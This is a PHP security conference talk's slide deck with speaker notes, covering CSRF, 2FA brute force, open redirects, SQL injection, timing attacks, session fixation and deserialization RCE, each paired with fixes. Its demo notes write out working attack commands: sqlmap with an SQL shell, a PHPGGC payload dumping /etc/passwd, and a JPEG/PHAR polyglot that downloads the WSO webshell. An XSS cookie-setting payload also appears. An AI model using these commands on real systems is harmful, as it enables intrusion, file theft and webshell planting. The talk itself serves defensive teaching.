class: title-slide longtitle

.conference[![](logos/%%conference%%.png)]
.introimg[![](hackthesystem/images/hack.png)]

# Hack The System
## Common ways to attack your platform

???

- As PHP developers, almost everything that we build is connected to the internet
- Or, to put it another way, a huge old network of people who want to break your stuff!!
- *Everyone* involved in development, from the person writing the code, to the CS team who might get the first hint that something is wrong, have a part to play.

---

class: title-slide longtitle

.conference[![](logos/%%conference%%.png)]
.introimg[![](hackthesystem/images/hack.png)]

# Hack The System
## Common ways to attack your platform


???

- Before I go on, I just want to say, it's so difficult to arrange an event like this
- Especially with the challenges of the past 2 years
- So many people are needed to make these things happens - organisers, sponsors, technical and more
- So from me, a personal thank you
- If you get an opportunity to speak to any of the organisers, let them know how much you appreciate it, and also provide feedback

- So, who am I?



---

class: section-title-c bottom left vanity-slide

.introimg[![](logos/tebex.svg)]

# Liam Wiltshire
## CTO and Head of PayOps

???

- Checkout and payments platform in the gaming space
- We do all the boring 'business' - 100 int'l payment methods, tax, compliance, AML, so our partners can focus on what they do best - making awesome games and experiences
- In my earlier career, I was described as a hacker - I was fast, and my code got the job done, but ..... maybe I wouldn't admit to having written it a month later!
- For the context of this talk however, when we refer to a 'hack' or 'hacker', we're referring to the type that is involved in system vulnerabilities, breaking into systems etc - not the developer sort! 

---

class: section-title-a center centralimage
# What This Talk Is
.highres[![](impostor/images/question.png)]

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

---
class: section-title-a centralimage
# What This Talk Is

- How to think about attacks
- Attacks I've seen in the real world
- Things that are likely to be in your codebase
- Things that can be fixed quickly
- Tools that you can use yourself

???

- The aim of this talk isn't necessarily to show off the newest, crazyiest attacks - there isn't a 'mic drop moment'
- Instead, we're going to look at the sorts of vulnerabilities that could well be in your system, and the sorts of attacks that an average organisation might see
    - We're not going to look at the crazy-complicated attacks that you're unlikely to see unless you are facebook

- So, before we look at some actual examples of attacks, I want to help you find vulnerabilities in your own systems, and know what to do when you find one (or have one reported to you)
 - In order to do this, it's often helpful to think like a hacker.
---

class: section-title-b center centralimage

# What are Attacks Intended For?
.highres[![](hackthesystem/images/whyhack.png)]

.reference[Technology vector created by macrovector (freepik.com/vectors/technology)]

???

- To start to identify likely targets, it's useful to think about _why_ a hacker might attack a system.
- After all, a hacker is unlikely to waste time trying to find a way into a particular part of the system if it's not worthwhile for them
 - So what are some of the reasons a hacker might attack a system?

---

class: content-even

# Take Down A System

- For profit or for fun
- Is likely to target parts of the system that can cause network or hardware disruption
 - CPU or network expensive activities
 - Self-replicating activities (fork bomb)

???

- Profit could be ransom
- It could also be a DDOS service that is being purchased by someone else

---

class: content-odd

# Gain Access To Data

- Data is valuable
 - Personal data can be resold
- You might not think the data you have is valuable
 - Could it be combined with other data?

???

- Doesn't have to be login data
- Imagine you had a service that allowed you to send yourself birthday reminders
 - Those dates might be 'memorable details' associated with that email address on another system (or a PIN number etc)

---

class: content-even

# Promoting Skills and Software

- Some attacks can be a 'billboard' to advertise the attackers skills, services or software
- Attacks will be promoted on hacker forums
- A DDOS service might launch attacks to demonstrate the power of their network, in order to gain customers

???

- Likely to be against more visible or known targets - at least within a certain industry

---
class: content-odd

# Because It's Easy

- Attackers will use tools to automate as much as possible
- This might include scanners that look for known vulnerabilities in re-used code 

???

- Attackers are generally not developers
   - They can (and will) write code, but they don't want to. As such they will look to automate and use tools as much as possible
- (frameworks, CMSes, libraries etc)
- Most of these are combated by keeping third party code, libraries etc up to date
- Some of the others are the sorts of attacks we'll talk about in 'level 1'

---

class: section-title-b center centralimage

# Classifying Security Vulnerabilities
.highres[![](hackthesystem/images/brain.png)]

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- Tebex, for a while, ran a bug bounty programme
- Thought we might get 1 or 2 reports - we were pretty confident in our skills and abilities
 - On day 1, we received over 50 reports!
- However, most of these were either invalid, or didn't pose any risk at all
 - Even the ones that were valid and we did action wouldn't exactly be considered high-priority.
- So how do you quantify how 'bad' a particular vulnerability is?

---

class: content-even halfhalf middle

# Vulnerability
# Rating
# Taxonomy

.right[![](hackthesystem/images/vrt.png)]

.reference[Bugcrowd (bugcrowd.com/vulnerability-rating-taxonomy)]

???

- VRT is a resource that outlines baseline priority ratings for common vulnerabilites
 - Was originally designed by Bugcrowd to assist bug hunters and Bugcrowd's triagers to assign severity to vulnerabilities 
- Examples:

---
class: content-even middle


- P1: Broken Authentication and Session Management >> Authentication Bypass
- P2: Application-Level Denial-of-Service (DoS) >> Critical Impact and/or Easy Difficulty
- P3: Broken Authentication and Session Management >> Session Fixation >> Remote Attack Vector
- P4: Server Security Misconfiguration >> No Rate Limiting on Form >> Email-Triggering


.reference[Bugcrowd (bugcrowd.com/vulnerability-rating-taxonomy)]

???

- The highre the 'P' score, the more critical
 - obviously bypassing authentication is bad!!
 - Application-level DOS (rather than being at the network-level) - it's more critical because it's either wide-reaching or easy to do - there is another (lower) rating for harder or narrower in scope attacks
 - Session Fixation - requires quite a few things to go 'right' (we'll look at what session fixation is shortly), and usually only catches a single user at a time, hence lower rating
 - Email triggering - most likely not going to have a major impact, more annoying for the recipient, with a potential loss of goodwill for the company
- There are also P5s, which in most uses are effectively ignored (no reward on a bug bounty, not really addressed unless a developer literally has nothing else to do)

---

class: content-odd

# Risk Impact Matrix

![](hackthesystem/images/riskimpact.png)

???

- Another way to assess is with a risk-impact matrix
_ Here you assess the probability of a given exploit being used (consider how easy it is and how readily discoverable it is) and the impact
   - Something that would be difficult to exploit and would (for example) only result in some emails being sent would likely be 'Very Low', whereas the ability to bypass authentication using a query string that gave full admin access to all your customer a would be Critical!

---

class: section-title-c center centralimage

# To Battle!
.highres[![](hackthesystem/images/battle.png)]

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- Let's be honest - when you came to this talk you probably wanted to see some attacks in action right
- So let's get on with it!
- We're going to look at 3 'levels'
 - some really simple potential vulnerabilities - small in scope but very easy
 - Some that are potentially more damaging, and still fairly easy - these might be your 'high' impact ones
 - Some that potentially give up full access to everything, but are more unlikely and harder to pull off

---

class: section-title-c center middle

# Level 1

???

---

class: content-even noheader tinycode

```twig
<table>
  <thead><tr><th>Name</th><th>Price</th><th></th></tr></thead>
  <tbody>
    {% for product in products %}
        <tr>
          <td>{{ product.name }}</td>
          <td>${{ product.price|number_format(2) }}</td>
          <td>
            <a href='{{ path("product_edit", {id: product.id}) }}'
               class='btn btn-success'>Edit</a>
            <a href='{{ path("product_delete", {id: product.id}) }}'
               class='btn btn-danger'>Delete</a>
          </td>
        </tr>
    {% endfor %}
  </tbody>
</table>
```

???

- Who has ever seen (or written) code like this before? I'm sure most of us have - I have
 - Seems fairly innocent, presumably the user has logged in and they're seeing a list of their products that they can edit or delete
- I'm sure a number of you have seen the problem with this

---
class: content-even noheader tinycode

```twig
<table>
  <thead><tr><th>Name</th><th>Price</th><th></th></tr></thead>
  <tbody>
    {% for product in products %}
        <tr>
          <td>{{ product.name }}</td>
          <td>${{ product.price|number_format(2) }}</td>
          <td>
            <a href='{{ path("product_edit", {id: product.id}) }}'
               class='btn btn-success'>Edit</a>
*            <a href='{{ path("product_delete", {id: product.id}) }}'
*               class='btn btn-danger'>Delete</a>
          </td>
        </tr>
    {% endfor %}
  </tbody>
</table>
```

???

- The delete is just a regular link - this means that it's going to be triggered by a GET request
 - Let's say (for example in Tebex's case), we have a fairly large community of users, and many of them know each other or hang out in shared discord, tweet each other etc
- You could create URLs that you send to others (presumably using a shortner to hide what it's linking to) - and if they click on them, and they're logged in (which they probably are), that's going to immediately go to the delete page
 - If you've got a confirmation step then great, but if not that product is now gone!
- This didn't exactly happen to us in the sense it could cause data loss, however you could (in theory) trick someone into changing the template used on their store
- In short, any action (anything where the user _does_ something) should be a POST request (in other words, a form), and should use CSRF tokens

---

class: content-odd

# 2FA

- 2FA is great
 - Every website should support it
- However, we need to make sure it's secure

???

- In my opinion, 2FA should be mandatory on every site, although I do understand the commercial realities between putting off non-tech-savy users and doing everything perfectly!
- Who here implements a time-based OTP (Google Auth, Authy)?
- How big is your 'window'? 2 minutes? 5 minutes?

---

class: content-odd
# 2FA 

- 5 minute window (in each direction) = 20 valid OTPs
- Total possible OTPs = 1,000,000 - 1 in 50,000
- On average you'd need 25,000 guesses to find a valid OTP
- 2,500 requests a minute - not that many!

???

- This is slightly simplified, as during that 10 minutes obviously some of those codes would no longer be valid and some that potentially were already tested would become valid
 - However, the principle is that an insecurely implemented 2FA gives a false sense of security

---
class: content-odd

# 2FA

- Use rate-limiting
 - However, rate-limiting on IP (as is provided by services such as CloudFlare) isn't enough
 - Attacker could use a large number of IPs, and share the session cookie between the instances to try lots of OTPs and bypass limites
- Rate-limiting needs to be against the account in question

---

class: content-even

# What Do You Suggest?

- If someone sees a login that they don't recognise, what do we usually suggest?

---
class: content-even

# What Do You Suggest?

- If someone sees a login that they don't recognise, what do we usually suggest?
- Password resetting
 - But is that enough?
 - What do you do with any existing sessions?

???

- I've seen plenty of applications where changing your password either:
 - Doesn't log anyone out
 - Only logs you out - doesn't expire any other sessions
- If an attacker is already in your account, then changing your password (or 2FA for that matter) doesn't make a difference
- Whenever any authentication details change (email address, password or 2FA) - _all_ sessions should be expired

---
class: content-odd middle center

## http<i></i>s://site.com/login/?return=
## https%3A%2F%site.com%2Fproducts

???
- Who has see a link like this before?
 - Fairly common - control where we will be sent back to after logging in (or performing some other action)
- This can be used to gain trust (and then potentially tricker users into sharing details etc)

---
class: content-odd middle center

## http<i></i>s://site.com/login/?return=
## **https%3A%2F%badsite.com%2Frelogin**

???
- The user has logged in on the correct site (and, as we advise, checked the URL etc)
- Who re-checks the URL _after_ they're redirected?
 - That badsite.com could ask them to re-login, or confirm their 2FA or any other number of actions that could then be used to compromise their data
 - If it looks like the original site, the user will probably never suspect a thing!

---

class: content-odd

# Open Redirect
- This is called an open redirect - the redirect can be changed to send the user wherever the attacker wants
 - Restrict redirect to just this domain
 - Created signed redirerct URLs that cannot be changed/spoofed
 - Only allow redirects to a pre-defined list of allowable URLs

???

- Open redirects are not a security vulnerability in themselves - they do not leak data or cause problems
 - However they can give the user trust of confidence that can then be exploited
- Various solutions exists
 - Restricting redirects to just the domain in question is one option - however if you have GET-based actions as we described before, that's still a potential risk
 - Create signed URLs, so the redirect URL comes with a signature that is verified before the redirect happens - this still allows for external redirects when required, but provides confidence that the links are approved 
  - This is something that Tebex does, as we have to perform external redirects
  - Similar to this, actually store all the redirect URLs in a database, and only provide a linkId or similar, and fetch the redirect out of the DB - could be DB heavy if you generate alot of redirect links
 - If there are only a limited number of places a user should be redirected to, maintain a list of these, and only accept redirects to one of these URLs - again potentially idenfitied by an ID

---

class: section-title-c center middle

# Level 2

???

- So we've been through some basic vulnerabilities - in scope they're all fairly small,
  - but perhaps one or two of you are thinking to your own codebases and realising that some of them exist
- The good news is that they're all simple to fix!
- Now we're going to look at a few vulerabilities that could have wider impacts

---
class: content-odd center

# SQL Injection


???

- No security talk would be complete without a mention of SQL injection.
 - However, the common argument I hear is:

---
class: content-odd center

# SQL Injection

![](hackthesystem/images/angry.png)

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- "Everyone uses an ORM these days - SQL injection isn't really a thing any more" - and most of the time you'd be right
 - However, I'll be the first to admit that sometimes I can be lazy - and the complicated, abstracted codebases we work on can hide potential gotchas

---
class: content-odd

```php
class emailStats {
  public function complicatedAnalyticsCall(string $email) {
      return DB::select(
        "SELECT COUNT(1) FROM payments p " .
        "FORCE INDEX (payments_email_status_idx) " .
        "INNER JOIN accounts a ON p.account_id = a.id " .
        "WHERE some complicated, expensive statement " .
        "AND p.email = '$email'"
      );
  }
}
```

???

- Have you ever written a query by hand, because the SQL generated by your ORM was dog slow? I have
- In this instance we _should_ use prepared statements, but I'd guess that it's not always done
- In this instance, perhaps you _know_ that the email address is coming from the database, so you trust the data
 - But someone else might not realise that - what if this function is re-used by another developer down the line,
   but now they're passing in an email address provided by a user?

---

class: content-odd

# sqlmap

- Manually finding and exploting a vulnerability would be very difficult
- sqlmap automates the process - simply provide a URL that _could_ have vulnerable params, and it'll do everything else 

???

- Even if we do have a vulnerable param in our code, it's easy to think it would be difficult (if not impossible) to exploit
 - But there are tools that will do the work for us
- sqlmap is a common tool used for finding and exploiting vulnerable params for mysql injection

---

class: content-odd center middle

# DEMO

???

- Show example code
- http://localhost:9999/mysql?title=pride&year=1810
- cd /home/liam/Projects/talks/hackthesystem/tools/sqlmap-dev
- ./sqlmap.py  --purge
- ./sqlmap.py -u "http://localhost:9999/mysql?title=pride&year=1810" --sql-shell
- SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES

---
class: content-odd

# SQL Injection

- **Always** use prepared statements
- Assume that _all_ data could be coming from a user   
- Remember, tools exist to maximise the potential of the smallest possible vulnerability

???

- No security talk would be complete without a mention of SQL injection.
- However, the common argument I hear is:

---
class: content-even

# Timing Attacks

- The initial aim of many hacks is to enumerate something
 - Like email addresses, to know which email addresses have accounts that could potentially be exploited
- One way of doing this if you don't have DB access is using timing attacks.

???

- There are many different types of timing attacks - comparison attacks (where the more of a string that matches, the longer it takes), index attacks (where the more of an index is consumed, the longer it takes)
   - These are covered in many different resources, and comparison functions such as hash_equals and password_verify are timing safe
- So instead, let's think about how we write code - we will often have different logic branches that do different things, for example:

---
class: content-even noheader

```php
$user = User::where('email', $email)->first();

if (!$user) {
    return redirect()->back()->withError(
        ['email' => 'Invalid login']
    );
}

if (!password_verify($password, $user->password)) {
    return redirect()->back()->withError(
        ['email' => 'Invalid login']
    );
}
```

???

- In this code, we've actually thought about security...

---
class: content-even noheader

```php
$user = User::where('email', $email)->first();

if (!$user) {
    return redirect()->back()->withError(
*        ['email' => 'Invalid login']
    );
}

if (!password_verify($password, $user->password)) {
    return redirect()->back()->withError(
*        ['email' => 'Invalid login']
    );
}
```

???

- We return the same error for either no user found or no password, so an attacker can't see if the email exists or not based on the message
- But is there another way of getting that information?
- In this code, password_verify takes an additional nonzero amount of time to run - so any time there is a matching email address, regardless of if the password is right or not, it will take longer
    - In order to do this accurately you need to run it a large number of times, to average out network latency etc, but it's entirely possible to do

---
class: content-even noheader tinycode nudgeup

```php
$users = [
    'liam@tebex.co.uk' => password_hash('testtest123', PASSWORD_DEFAULT),
    'liam@w.iltshi.re' => password_hash('testtest123', PASSWORD_DEFAULT),
];
$tests = ['nouser@test.com', 'liam@tebex.co.uk', 'anothernonuser@example.com']; $times = [];

foreach ($tests as $test) {
    $times[$test] = 0; $x = 1;
    while ($x <= 10) {
        $start = microtime(true);
        usleep(rand(10000,99999));
        $user = $users[$test] ?? false;
        if ($user) { password_verify('aksjdhkasjdh81', $user); }
        $times[$test] += (microtime(true) - $start);
        $x++;
    }
    $times[$test] /= 10;
}
var_dump($times);
```

???

- Apologies for the formatting - trying to get it on one slide!
- Explain what the code does
 - Not a completely representative test as we're pulling the records from an array
 - But we are adding a usleep to simulate network etc - between 10 and 100 ms - the point being that the 'jitter' will average out!

---

class: content-even

```php
array(3) {
  'nouser@test.com' => double(0.040307402610779)
  
  'liam@tebex.co.uk' => double(0.10314846038818)
  
  'anothernonuser@example.com' => double(0.067523074150085)
}
```

???

- You can see that the valid user took a clearly detectable amount of additional time
 - In the real world, in order to average around network lag, DB query variation etc you'd need to run the query significantly more than 10 times, but the the power of some botnets etc these days, that's entirely possible!

---
class: content-even

# Timing Attacks
- Rate Limit
  <br /><br />
- Fixed execution time functions
 
???

- As we've touched upon before, many large botnets have thousands of IPs - so they can work around the rate limit, however the likelyhood is those different connections will be in different locations, have different latency, making averaging out the variability much harder
- Forcing a function to run for a specific amount of time is a double-edged sword - on the one hand it can work, however, if you set it too short then it won't make all calls last the same amount of time, and if you set it too long you are making users wait unnecessarily.
 - But, as an additional measure that makes such attacks harder (and thus not worth it, meaning the attacker will move onto an easier target), it can work

---

class: content-odd nudgeup tinycode

# Session Fixation

- Session fixation is when an attacker tricks a victim into using a session they've already created
- In the bad old days, `?PHPSESSID=xxxx` was a pretty easy way to get a victim to use your session
- However it's still possible now:

```php
http://yoursite.com/page.php
 ↳ ?q=<script>document.cookie=
 ↳ "PHPSESSID=qvidf3pweno6c12whk3hk26oxs0hjke0";</script>
```

???
- Victim logs in with the session, attacker can then use the session to access the victim's account
- Again, the potential weakness is invalidated user input - imagine you have a page that displays a user-provided value
 - Perhaps originally it wasn't user provided, or perhaps you figured (as I have done before) - the user is only going to damage their own account, it's no big deal
- If this link is provided to someone and they don't check it (let's be honest, alot of users wouldn't understand what that ?q= does anyway), that javascript could be output to the page, setting the session in a cookie

---
class: content-odd

# Session Fixation
- **Never** trust user input!
- Regenerate sessions on any session-changing action, especially login
 - Setting a new session ID for the now logged in user means the old session ID (that the attacker has, is still not logged in)

---

class: section-title-a center middle

# Level 3

???

- Now we're going to look at an attack (and some variations to consider) that could in theory allow an attacker to gain full access to your system
 - They are definitely more difficult to pull off, and with some basic validation are prevented, but this is the sort of thing that is possible if you don't account for every piece of data

---

class: content-even center centralimage

# Remote Code Execution (RCE)

.highres[![](hackthesystem/images/rce.png)]

.reference[Technology vector created by macrovector (freepik.com/vectors/technology)]

???

- RCEs are the nightmare we hope we don't have to face - where an attacker can get our application (or server) to run code they want it to
 - Once the attacker can run one piece of code, it's likely they can use that to give themselves greater access to allow them to run further commands, download sensitve data, potentially even make changes to the application

---
class: content-even

# Remote Code Execution (RCE)

- RCEs can happen in a variety of ways, such as:
 - Supply Chain Attacks
 - Software design flaws (OS, stack software)
 - Dynamic code execution/injection

???

- There are lots of ways that an RCE can happen
 - it could be by using an infected third party library - a "supply chain attack"
  - (such as incidents over the past few years with the event-stream npm package and various wordpress plugins that have been purchased by bad actors to inject spam into hundreds of thousands of sites)
 - There have been numerious potential RCE vectors in software including openssl, apache, nginx and PHP
- For the first two, keeping your libraries and other software you use up to date is your main defense, as well as monitoring security advisories
 - For PHP specifically, Roave have a composer package that deals with alot of this, and if you are using private packagist they will send you advisories on packages you have installed
 - other languages and package managers have other ways of doing it, such as `npm audit`
- So we're going to look one way of performing dynamic code execution

---
class: content-even

# serialize() / unserialize()

- `serialize()` returns a string containing a byte-stream representation of any value that can be stored in PHP.
- `unserialize()` can use this string to recreate the original variable values.
 - This includes objects

???

- In PHP, serialize and unserialize are super useful functions that allow us to convert variables into strings, then re-hydrate them back into variables
- This includes the ability to convert objects into strings and back again
 - The object itself isn't turned into a string (so the string doesn't contain references to the objects methods etc), but when `unserialize` is called, effectively it creates an instance of that object, and pushes the properties to it
- Used in all sorts of frameworks and libraries, such as Laravel for jobs

---

class: content-even tinycode

# unserialize()

```php
class SaasCompiler
{
    private $cacheFile;
    private $compiledSass = '';
    
    public function getSass(): string
    {
        return $this->compiledSass;
    }
    
    public function __wakeup()
    {
        $this->compiledSass = file_get_contents($this->cacheFile);
    }
}
```

???

- When an object is unserialized, PHP will check for the existance of a `__wakeup()` or `__unserialize()` function, and will run them
 - In poorly designed code, this can lead to remote code being executed
 - So, if we can trick the application into unserializing a 'bad' object:
   - we could set `cacheFile` to something malicious - say the config file or passwd file 
   - Then on wakeup it would grab that file and assign it to compiledSass, which is presumably going to be output somewhere
 - Obviously this could be bad!
- It can also impact other automatically executed calls as well - such as `__destruct()`, `__toString()` etc

---
class: content-even

# How Bad Can It Be?

- Guessing at every possible serialized object that _might_ have a vulnerable `__destruct()` or `__wakeup()` isn't practical
- But what about commonly used code? PHP libraries that are installed on thousands of codebases?
 - Trying to create these exploits manually would be a huge amount of work
 - Thankfully (for them), they don't need to!

---
class: content-odd

# PHPGGC

- PHP Generic Gadget Chains is a library of payloads that exploit known vulnerable `unserialize()` calls
- Covers well known frameworks and libraries such as Laravel, Guzzle, Wordpress, Monolog and more
- Will also generate payloads for you to use in an attack

---

class: section-title-b center middle

# DEMO

???

- Show example code
- cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
- ./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload
- mv payload ../../laravel/app/Http/Controllers/
- http://localhost:9999/rce/payload
- http://localhost:9999/passwd

---

class: content-odd center

.highres[![](hackthesystem/images/bank.png)]

???

- And the hacker is taking your vulnerability all the way to the bank!
- Now, the key is, are you really going to accept a random file upload without checking it, grab it's contents and just so happen to run unserialize on it?
 - Of course you are not!

---

class: content-odd center

.highres[![](hackthesystem/images/idea.png)]

???

- But they're ahead of you!

---

class: content-even

# Polyglot JPEG/PHAR files
.small[
- Within PHP, there is a `phar://` stream - this will tell PHP to treat the file as a PHP archive.
  - When the phar file is loaded, the metadata within the phar manifest is `unserialize`d
- At the same time, you can hide a phar file within a jpeg
- The phar load / unserialize step can happen on more or less any file-based function - including some you might innocently use to validate the file itself!
 - `file`, `file_exists`, `filesize`, `is_dir` and more
]
???

- For mostly time reasons (and the fact it gets very complicated and makes my head explode!), we can't go into the minute detail of how this works
- However, remember our exploit above relies on injecting data into a serialized object that is going to be deserialized.....
- If we hide the phar in a jpeg, then that will get past one of the initial upload checks that usually happens
- If only there was a tool that could this for us.....


---

class: section-title-c center middle

# DEMO

???

- Show example code
- cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
- ./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg
- mv loaded-mono.jpg ../../laravel/app/Http/Controllers/
- http://localhost:9999/image?filename=phar://loaded-mono.jpg
- http://localhost:9999/wso.php
- PW ghost287

---

class: content-even

# Polyglot JPEG/PHAR files

- This still requires trusting user input, in that the system needs to be tricked into using the `phar://` wrapper
- So, yet again **never trust user input!**
- Bear in mind this might not be on a user request - if you have scheduled tasks this could be an attack vector as well
 - **Never** run scheduled tasks as root!

???

- Imagine you have an app that uploads an image and saves the filename, then later on that image is processed by a scheduled task
   - You might assume the data in the database is fine, but do you know it is validated at creation?
- Even worse if your scheduled tasks run as root - I've seen (and done!) plenty of cron tasks as root before I understood how bad it could be - you've just given the hacker full root access!

---

class: content-odd

# Tools

- sqlmap: https://sqlmap.org/
- PHPGGC: https://github.com/ambionics/phpggc
- Metasploit: https://www.metasploit.com/
- BurpSuite: https://portswigger.net/burp

???

- We've used sqlmap and PHPGGC in this talk
- Also just want to signpost metasploit, which is a pen testing tool that can be used to automate thousands of potential attack vectors
 - And burpsuite which is another pen testing tool, and includes a proxy tool that allows you to intercept, modify and resend HTTP requests on the fly to try different attack vectors

---
class: summary-slide

- Hacking and security will always be part of development
- "Completely Secure" isn't possible - our aim is to make it as secure as possible, and make it difficult enough for attackers that it's not worth their time
- Human error is always part of the attack vector
 - Think like an attacker when reading or reviewing code
 - Assume your users will make mistakes, and ensure you are protecting them

???
- Hacking and security will always be part of development
   - it's a cat-and-mouse game - we'll keep making applications more secure, and the attackers will keep devising new ways to get in
- "Completely Secure" isn't possible - our aim is to make it as secure as possible, and make it difficult enough for attackers that it's not worth their time
   - The reality is that no system is 100% secure - but hacking is a business and if the reward isn't worth the time and effort required, then an attacker will look for one that is 
- Human error is always part of the attack vector
   - Human error could be us as developers, it could be our supply chain, or it could be users - try to think about all the potential ways the human error could leave a way in, and what you can do to mitigate it
- Think like an attacker when reading or reviewing code
   - Remember, an attacker isn't going to manually try to exploit that vulnerable parameter - they'll use tools to make their life easier, so use the tools first before a hacker can get to it
- Assume your users will make mistakes, and ensure you are protecting them
   - There are ways that we can defend against mistakes our users might make - user's can be expected to understand what every URL does, and we have to assume they will click that link that their 'friend' sent them, so let's ensure the opportunity for something bad to happen isn't there
- To finish, I want to leave you with this quote:

---
class: summary-slide middle

> _“The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards — and even then I have my doubts.”_

.right[Gene Spafford]


---


class: thanks-slide

.conference[![](logos/%%conference%%.png)]
.introimg[![](http://tebex.co.uk/img/tebex.svg)]

# Thank You

### %%joindin%%
### Liam Wiltshire
### @l_wiltshire
### liam@tebex.co.uk
